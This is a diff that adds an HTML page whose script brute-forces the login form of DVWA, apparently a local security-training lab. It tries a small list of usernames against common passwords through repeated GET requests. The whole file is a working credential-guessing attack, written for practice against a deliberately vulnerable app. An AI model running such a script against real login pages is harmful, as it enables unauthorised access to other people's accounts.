@@ -1,0 +1,28 @@
+<html>
+<body>
+
+<script>
+/*
+  - usernames obtained from peeking at `users` db generated in /setup.php
+  - passwords obtained from WAHH p. 163
+*/
+var un = ["admin", "gordonb", "1337", "pablo", "smithy"],
+    pw = ["password", "dvwa", "12345678", "qwerty",
+          "abc123", "111111", "monkey", "12345", "letmein"];
+
+//  loop over all combos
+for (var i = 0; i < un.length; i++) {
+  for (var j = 0; j < pw.length; j++) {
+    var req = new XMLHttpRequest();
+    var url = "http://localhost/dvwa/vulnerabilities/brute/?"
+              + "username=" + un[i] + "&password=" + pw[j] + "&Login=Login";
+    req.open("GET", url, false); // 3rd parameter is "asynchronous"--this
+    req.send();                  // way it waits for a response before
+                                 // sending each subsequent request
+  }
+}
+
+</script>
+
+</body>
+</html>
